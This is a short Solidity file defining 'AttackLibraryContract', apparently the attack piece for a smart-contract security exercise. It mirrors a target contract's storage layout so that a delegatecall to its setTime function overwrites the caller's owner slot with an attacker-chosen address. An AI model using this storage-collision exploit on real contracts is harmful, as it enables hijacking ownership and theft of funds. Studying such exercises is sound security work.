//SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

contract AttackLibraryContract {
    uint256 storedTime;
    uint256 storedTime2;
    address owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
